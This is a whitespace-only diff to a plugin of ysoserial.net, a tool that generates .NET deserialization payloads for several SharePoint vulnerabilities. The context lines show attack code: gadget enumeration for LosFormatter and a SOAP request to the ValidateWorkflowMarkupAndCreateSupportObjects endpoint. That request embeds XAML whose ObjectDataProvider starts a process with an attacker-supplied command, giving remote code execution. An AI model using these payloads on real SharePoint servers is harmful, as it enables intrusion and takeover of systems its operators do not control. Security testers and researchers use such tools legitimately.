@@ -9,8 +9,8 @@ using ysoserial.Helpers;
 
 /**
  * Author: Soroush Dalili (@irsdl)
- * 
- * Comments: 
+ *
+ * Comments:
  *  This plugin generates payloads that can be used for a few SharePoint vulnerabilities that are related to deserialization.
  *  Please feel free to contribute to this and add your name at the top.
  *  It currently supports:
@@ -126,7 +126,7 @@ namespace ysoserial.Plugins
 
             string formatter = "losformatter";
             string losFormatterPayload = "";
-            
+
             var types = AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes());
             // Populate list of available gadgets
             var generatorTypes = types.Where(p => typeof(IGenerator).IsAssignableFrom(p) && !p.IsInterface);
@@ -239,10 +239,10 @@ Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" Source="""+c
 <soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Body><ValidateWorkflowMarkupAndCreateSupportObjects xmlns=""http://microsoft.com/sharepoint/webpartpages""><workflowMarkupText><![CDATA[
 <SequentialWorkflowActivity x:Class=""."" x:Name=""Workflow2"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
 xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/workflow"">
-<Rd:ResourceDictionary xmlns:System=""clr-namespace:System;assembly=mscorlib, Version=4.0.0.0,    
+<Rd:ResourceDictionary xmlns:System=""clr-namespace:System;assembly=mscorlib, Version=4.0.0.0,
 Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=System,
 Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:Rd=""clr-namespace:System.Windows;Assembly=PresentationFramework,
-Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" xmlns:ODP=""clr-namespace:System.Windows.Data;Assembly=PresentationFramework, Version=4.0.0.0, Culture=neutral,    
+Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" xmlns:ODP=""clr-namespace:System.Windows.Data;Assembly=PresentationFramework, Version=4.0.0.0, Culture=neutral,
 PublicKeyToken=31bf3856ad364e35"">
 <ODP:ObjectDataProvider x:Key=""LaunchCmd"" MethodName=""Start"">
 <ObjectDataProvider.ObjectInstance><Diag:Process><Diag:Process.StartInfo>" + cmdPart + @"</Diag:ProcessStartInfo></Diag:Process.StartInfo></Diag:Process>
